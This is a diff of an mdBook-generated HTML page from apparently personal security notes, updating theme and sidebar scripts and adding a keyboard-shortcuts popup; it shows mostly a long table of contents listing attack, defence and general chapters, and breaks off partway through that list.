@@ -1,5 +1,5 @@
 <!DOCTYPE HTML>
-<html lang="en" class="light" dir="ltr">
+<html lang="en" class="light sidebar-visible" dir="ltr">
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
@@ -7,7 +7,7 @@
 
 
         <!-- Custom HTML head -->
-        
+
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
@@ -22,27 +22,42 @@
         <link rel="stylesheet" href="../../../../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" href="../../../../highlight.css">
-        <link rel="stylesheet" href="../../../../tomorrow-night.css">
-        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
         <link rel="stylesheet" href="../../../../theme/pagetoc.css">
 
-    </head>
-    <body class="sidebar-visible no-js">
-    <div id="body-container">
-        <!-- Provide site root to javascript -->
-        <script>
-            var path_to_root = "../../../../";
-            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
-        </script>
 
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
         <!-- Work around some values being stored in localStorage wrapped in quotes -->
         <script>
             try {
-                var theme = localStorage.getItem('mdbook-theme');
-                var sidebar = localStorage.getItem('mdbook-sidebar');
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
 
                 if (theme.startsWith('"') && theme.endsWith('"')) {
                     localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
@@ -56,70 +71,51 @@
 
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script>
-            var theme;
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
             try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
             if (theme === null || theme === undefined) { theme = default_theme; }
-            var html = document.querySelector('html');
+            const html = document.documentElement;
             html.classList.remove('light')
             html.classList.add(theme);
-            var body = document.querySelector('body');
-            body.classList.remove('no-js')
-            body.classList.add('js');
+            html.classList.add("js");
         </script>
 
         <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script>
-            var body = document.querySelector('body');
-            var sidebar = null;
-            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
             if (document.body.clientWidth >= 1080) {
                 try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                 sidebar = sidebar || 'visible';
             } else {
                 sidebar = 'hidden';
+                sidebar_toggle.checked = false;
             }
-            sidebar_toggle.checked = sidebar === 'visible';
-            body.classList.remove('sidebar-visible');
-            body.classList.add("sidebar-" + sidebar);
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
         </script>
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
-            <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../introduction.html">Welcome!</a></li><li class="chapter-item expanded "><a href="../../../../attack/index.html"><strong aria-hidden="true">1.</strong> Attack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/index.html"><strong aria-hidden="true">1.1.</strong> AI</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/ai/ai_fundamentals.html"><strong aria-hidden="true">1.1.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/binary_exploitation/index.html"><strong aria-hidden="true">1.2.</strong> Binary Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/binary_exploitation/stack_based_buffer_overflows_linux_x86.html"><strong aria-hidden="true">1.2.1.</strong> Stack-Based Buffer Overflows Linux x86</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.3.</strong> Cloud</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.4.</strong> Crypto</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.5.</strong> GamePwn</div></li><li class="chapter-item "><a href="../../../../attack/hardware_ics/index.html"><strong aria-hidden="true">1.6.</strong> Hardware / ICS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/hardware_ics/hardware_ics_fundamentals.html"><strong aria-hidden="true">1.6.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/index.html"><strong aria-hidden="true">1.7.</strong> Initial Access</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/index.html"><strong aria-hidden="true">1.7.1.</strong> Attacking Common Applications</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/app_discovery_enum.html"><strong aria-hidden="true">1.7.1.1.</strong> Application Discovery & Enum</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_cms.html"><strong aria-hidden="true">1.7.1.2.</strong> CMS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_gateway_interfaces.html"><strong aria-hidden="true">1.7.1.3.</strong> Common Gateway Interfaces</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_management.html"><strong aria-hidden="true">1.7.1.4.</strong> Customer Service / Configuration Management</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_infra_network_tools.html"><strong aria-hidden="true">1.7.1.5.</strong> Infra & Network Tools</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_misc_apps.html"><strong aria-hidden="true">1.7.1.6.</strong> Misc Applications</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_other_apps.html"><strong aria-hidden="true">1.7.1.7.</strong> Other Notable Apps</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_servlet_containers.html"><strong aria-hidden="true">1.7.1.8.</strong> Servlet Containers / Software Dev</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_applications/attacking_thick_client.html"><strong aria-hidden="true">1.7.1.9.</strong> Thick Client Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/index.html"><strong aria-hidden="true">1.7.2.</strong> Attacking Common Services</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_common_services_fundamentals.html"><strong aria-hidden="true">1.7.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_dns.html"><strong aria-hidden="true">1.7.2.2.</strong> DNS</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_email_services.html"><strong aria-hidden="true">1.7.2.3.</strong> Email Services</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_ftp.html"><strong aria-hidden="true">1.7.2.4.</strong> FTP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_rdp.html"><strong aria-hidden="true">1.7.2.5.</strong> RDP</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_smb.html"><strong aria-hidden="true">1.7.2.6.</strong> SMB</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/attacking_common_services/attacking_sql.html"><strong aria-hidden="true">1.7.2.7.</strong> SQL</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/footprinting.html"><strong aria-hidden="true">1.7.3.</strong> Footprinting</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/index.html"><strong aria-hidden="true">1.7.4.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/password_attacks_fundamentals.html"><strong aria-hidden="true">1.7.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.7.4.2.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.7.4.3.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/remote_password_attacks.html"><strong aria-hidden="true">1.7.4.4.</strong> Remote</a></li><li class="chapter-item "><a href="../../../../attack/initial_access/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.7.4.5.</strong> Windows</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/initial_access/shells_payloads.html"><strong aria-hidden="true">1.7.5.</strong> Shells & Payloads</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/linux/index.html"><strong aria-hidden="true">1.8.</strong> Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/linux/linux_fundamentals.html"><strong aria-hidden="true">1.8.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/macos/index.html"><strong aria-hidden="true">1.9.</strong> MacOS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/macos/macos_fundamentals.html"><strong aria-hidden="true">1.9.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.10.</strong> Mobile</div></li><li class="chapter-item "><div><strong aria-hidden="true">1.11.</strong> OSINT</div></li><li class="chapter-item "><a href="../../../../attack/pivoting/index.html"><strong aria-hidden="true">1.12.</strong> Pivoting - old</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/pivoting/chisel.html"><strong aria-hidden="true">1.12.1.</strong> Chisel</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ligolo.html"><strong aria-hidden="true">1.12.2.</strong> Ligolo</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/socat.html"><strong aria-hidden="true">1.12.3.</strong> Socat</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/ssh_und_proxychains.html"><strong aria-hidden="true">1.12.4.</strong> SSH und Proxychains</a></li><li class="chapter-item "><a href="../../../../attack/pivoting/sshuttle.html"><strong aria-hidden="true">1.12.5.</strong> Sshuttle</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/index.html"><strong aria-hidden="true">1.13.</strong> Post-Exploitation</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/file_transfers.html"><strong aria-hidden="true">1.13.1.</strong> File Transfers</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/index.html"><strong aria-hidden="true">1.13.2.</strong> Password Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/linux_password_attacks.html"><strong aria-hidden="true">1.13.2.1.</strong> Linux</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/network_password_attacks.html"><strong aria-hidden="true">1.13.2.2.</strong> Network</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/password_attacks/windows_password_attacks.html"><strong aria-hidden="true">1.13.2.3.</strong> Windows</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.13.3.</strong> Persistence</div></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/pivoting.html"><strong aria-hidden="true">1.13.4.</strong> Pivoting</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/index.html"><strong aria-hidden="true">1.13.5.</strong> PrivEsc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/linux_privesc.html"><strong aria-hidden="true">1.13.5.1.</strong> Linux PrivEsc</a></li><li class="chapter-item "><a href="../../../../attack/post_exploitation/privesc/windows_privesc.html"><strong aria-hidden="true">1.13.5.2.</strong> Windows PrivEsc</a></li></ol></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">1.14.</strong> Reversing</div></li><li class="chapter-item "><a href="../../../../attack/tools/index.html"><strong aria-hidden="true">1.15.</strong> Tools</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/tools/metasploit.html"><strong aria-hidden="true">1.15.1.</strong> Metasploit</a></li><li class="chapter-item "><a href="../../../../attack/tools/nmap.html"><strong aria-hidden="true">1.15.2.</strong> nmap</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/index.html"><strong aria-hidden="true">1.16.</strong> Vuln Scanning</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/vuln_scanning/nessus.html"><strong aria-hidden="true">1.16.1.</strong> Nessus</a></li><li class="chapter-item "><a href="../../../../attack/vuln_scanning/openvas.html"><strong aria-hidden="true">1.16.2.</strong> OpenVAS</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/index.html"><strong aria-hidden="true">1.17.</strong> Web</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/index.html"><strong aria-hidden="true">1.17.1.</strong> 0x00</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/fundamentals/fuzzing_fundamentals.html"><strong aria-hidden="true">1.17.1.1.</strong> Fuzzing</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/http_https_fundamentals.html"><strong aria-hidden="true">1.17.1.2.</strong> HTTP/HTTPs</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_proxy_fundamentals.html"><strong aria-hidden="true">1.17.1.3.</strong> Proxies</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_recon_fundamentals.html"><strong aria-hidden="true">1.17.1.4.</strong> Reconnaissance</a></li><li class="chapter-item "><a href="../../../../attack/web/fundamentals/web_applications_fundamentals.html"><strong aria-hidden="true">1.17.1.5.</strong> Web Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/index.html"><strong aria-hidden="true">1.17.2.</strong> Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/index.html"><strong aria-hidden="true">1.17.2.1.</strong> Client-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/client_side/xss.html"><strong aria-hidden="true">1.17.2.1.1.</strong> XSS</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/index.html"><strong aria-hidden="true">1.17.2.2.</strong> Injections</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/command_injections.html"><strong aria-hidden="true">1.17.2.2.1.</strong> Command Injections</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/injection_attacks/sqli.html"><strong aria-hidden="true">1.17.2.2.2.</strong> SQLi</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/index.html"><strong aria-hidden="true">1.17.2.3.</strong> Server-side</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/file_inclusion.html"><strong aria-hidden="true">1.17.2.3.1.</strong> File Inclusion</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/file_upload_attacks.html"><strong aria-hidden="true">1.17.2.3.2.</strong> File Upload Attack</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/http_verb_tampering.html"><strong aria-hidden="true">1.17.2.3.3.</strong> HTTP Verb Tampering</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/idor.html"><strong aria-hidden="true">1.17.2.3.4.</strong> IDOR</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssi.html"><strong aria-hidden="true">1.17.2.3.5.</strong> SSI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssrf.html"><strong aria-hidden="true">1.17.2.3.6.</strong> SSRF</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/ssti.html"><strong aria-hidden="true">1.17.2.3.7.</strong> SSTI</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xlst.html"><strong aria-hidden="true">1.17.2.3.8.</strong> XLST</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/server_side/xxe.html"><strong aria-hidden="true">1.17.2.3.9.</strong> XXE</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/index.html"><strong aria-hidden="true">1.17.2.4.</strong> Web Service & API</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_api.html"><strong aria-hidden="true">1.17.2.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/api_attacks.html"><strong aria-hidden="true">1.17.2.4.2.</strong> APIs</a></li><li class="chapter-item "><a href="../../../../attack/web/web_attacks/web_service_api/web_service_attacks.html"><strong aria-hidden="true">1.17.2.4.3.</strong> Web Service</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/authentication/index.html"><strong aria-hidden="true">1.17.3.</strong> Authentication</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/authentication/broken_authentication.html"><strong aria-hidden="true">1.17.3.1.</strong> Broken Authentication</a></li><li class="chapter-item "><a href="../../../../attack/web/authentication/login_brute_forcing.html"><strong aria-hidden="true">1.17.3.2.</strong> Login Brute Forcing</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/cms/index.html"><strong aria-hidden="true">1.17.4.</strong> CMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/cms/cms.html"><strong aria-hidden="true">1.17.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/web/cms/wordpress.html"><strong aria-hidden="true">1.17.4.2.</strong> Wordpress</a></li></ol></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/index.html"><strong aria-hidden="true">1.17.5.</strong> Web Security</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/javascript_deobfuscation.html"><strong aria-hidden="true">1.17.5.1.</strong> JavaScript (De-)Obfuscation</a></li><li class="chapter-item "><a href="../../../../attack/web/web_security_techniques/session_security.html"><strong aria-hidden="true">1.17.5.2.</strong> Session Security</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../../../attack/windows/index.html"><strong aria-hidden="true">1.18.</strong> Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/windows_fundamentals.html"><strong aria-hidden="true">1.18.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/index.html"><strong aria-hidden="true">1.18.2.</strong> Active Directory</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/intro_ad.html"><strong aria-hidden="true">1.18.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/index.html"><strong aria-hidden="true">1.18.2.2.</strong> Enumeration and (basic) Attacks</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_initial_enum.html"><strong aria-hidden="true">1.18.2.2.1.</strong> Initial Enumeration</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_sniffing_for_foothold.html"><strong aria-hidden="true">1.18.2.2.2.</strong> Foothold</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_user_hunting.html"><strong aria-hidden="true">1.18.2.2.3.</strong> User Hunting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_internal_password_spraying.html"><strong aria-hidden="true">1.18.2.2.4.</strong> Internal Password Spraying</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_credentialed_enum_lotl.html"><strong aria-hidden="true">1.18.2.2.5.</strong> Credentialed Enum & LOTL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_kerberoasting.html"><strong aria-hidden="true">1.18.2.2.6.</strong> Kerberoasting</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_acl_abuse.html"><strong aria-hidden="true">1.18.2.2.7.</strong> ACL</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_extras.html"><strong aria-hidden="true">1.18.2.2.8.</strong> Extras</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_domain_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.9.</strong> Domain Trusts Attacks</a></li><li class="chapter-item "><a href="../../../../attack/windows/ad/enum_and_attacks/ad_cross_forest_trust_attacks.html"><strong aria-hidden="true">1.18.2.2.10.</strong> Cross-Forest Trust Attacks</a></li></ol></li></ol></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../../../../defend/index.html"><strong aria-hidden="true">2.</strong> Defend</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/index.html"><strong aria-hidden="true">2.1.</strong> Defensive Considerations, Mitigation, Hardening</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/defensive_considerations/ad_defensive_considerations.html"><strong aria-hidden="true">2.1.1.</strong> AD</a></li><li class="chapter-item "><a href="../../../../defend/defensive_considerations/common_application_hardening.html"><strong aria-hidden="true">2.1.2.</strong> Common Applications</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/digital_forensics/index.html"><strong aria-hidden="true">2.2.</strong> Digital Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/index.html"><strong aria-hidden="true">2.2.1.</strong> Disk Forensics</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/digital_forensics/disk_forensics/windows_event_logs.html"><strong aria-hidden="true">2.2.1.1.</strong> Windows Event Logs</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.2.</strong> Memory Forensics</div></li><li class="chapter-item "><div><strong aria-hidden="true">2.2.3.</strong> Network Forensics</div></li></ol></li><li class="chapter-item "><a href="../../../../defend/incident_response/index.html"><strong aria-hidden="true">2.3.</strong> Incident Response</a></li><li class="chapter-item "><a href="../../../../defend/malware_analysis/index.html"><strong aria-hidden="true">2.4.</strong> Malware Analysis</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/malware_analysis/intro_malware_analysis.html"><strong aria-hidden="true">2.4.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><a href="../../../../defend/siem/index.html"><strong aria-hidden="true">2.5.</strong> SIEM</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../defend/siem/siem_fundamentals.html"><strong aria-hidden="true">2.5.1.</strong> 0x00</a></li></ol></li><li class="chapter-item "><div><strong aria-hidden="true">2.6.</strong> Threat Hunting</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../general/index.html"><strong aria-hidden="true">3.</strong> General</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/index.html"><strong aria-hidden="true">3.1.</strong> Assessments</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/assessments/standards.html"><strong aria-hidden="true">3.1.1.</strong> Assessment Standards</a></li><li class="chapter-item "><a href="../../../../general/assessments/security_assessment.html"><strong aria-hidden="true">3.1.2.</strong> Security Assessment</a></li><li class="chapter-item "><a href="../../../../general/assessments/vulnerability_assessment.html"><strong aria-hidden="true">3.1.3.</strong> Vulnerability Assessment</a></li></ol></li><li class="chapter-item "><a href="../../../../general/dbms/index.html"><strong aria-hidden="true">3.2.</strong> DBMS</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/dbms/dbms_fundamentals.html"><strong aria-hidden="true">3.2.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/dbms/mysql_fundamentals.html"><strong aria-hidden="true">3.2.2.</strong> MySQL</a></li><li class="chapter-item "><div><strong aria-hidden="true">3.2.3.</strong> Neo4J</div></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/index.html"><strong aria-hidden="true">3.3.</strong> Elastic Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/building_great_search_experiences.html"><strong aria-hidden="true">3.3.1.</strong> Building Great Search Experiences</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/configuring_index_time_series_data.html"><strong aria-hidden="true">3.3.2.</strong> Configuring Elasticsearch Index for Time Series Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/index.html"><strong aria-hidden="true">3.3.3.</strong> Data Analysis with Kibana</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/02_search_your_data.html"><strong aria-hidden="true">3.3.3.1.</strong> Search Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/03_visualize_your_data.html"><strong aria-hidden="true">3.3.3.2.</strong> Visualize Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/04_additional_visualizations.html"><strong aria-hidden="true">3.3.3.3.</strong> Additional Visualizations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/05_present_your_data.html"><strong aria-hidden="true">3.3.3.4.</strong> Present Your Data</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/06_analyze_your_data_with_ml.html"><strong aria-hidden="true">3.3.3.5.</strong> Analyze Your Data With Machine Learning</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/07_advanced_kibana.html"><strong aria-hidden="true">3.3.3.6.</strong> Advanced Kibana</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/data_analysis_with_kibana/08_alerting.html"><strong aria-hidden="true">3.3.3.7.</strong> Alerting</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/index.html"><strong aria-hidden="true">3.3.4.</strong> Elasticsearch Engineer</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/01_intro_elasticsearch.html"><strong aria-hidden="true">3.3.4.1.</strong> 0x00</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/02_data_modelling.html"><strong aria-hidden="true">3.3.4.2.</strong> Data Modelling</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/03_search.html"><strong aria-hidden="true">3.3.4.3.</strong> Search</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/04_aggregations.html"><strong aria-hidden="true">3.3.4.4.</strong> Aggregations</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/05_data_processing.html"><strong aria-hidden="true">3.3.4.5.</strong> Data Processing</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/06_distributed_datastore.html"><strong aria-hidden="true">3.3.4.6.</strong> Distributed Datastore</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/07_data_management.html"><strong aria-hidden="true">3.3.4.7.</strong> Data Management</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/elasticsearch_engineer/08_cluster_management.html"><strong aria-hidden="true">3.3.4.8.</strong> Cluster Management</a></li></ol></li><li class="chapter-item "><a href="../../../../general/elastic_stack/esql_for_security_analysts.html"><strong aria-hidden="true">3.3.5.</strong> ES|QL for Security Analysts</a></li><li class="chapter-item "><a href="../../../../general/elastic_stack/kubernetes_basics.html"><strong aria-hidden="true">3.3.6.</strong> Kubernetes Basics</a></li></ol></li><li class="chapter-item "><a href="../../../../general/networking/index.html"><strong aria-hidden="true">3.4.</strong> Networking</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item 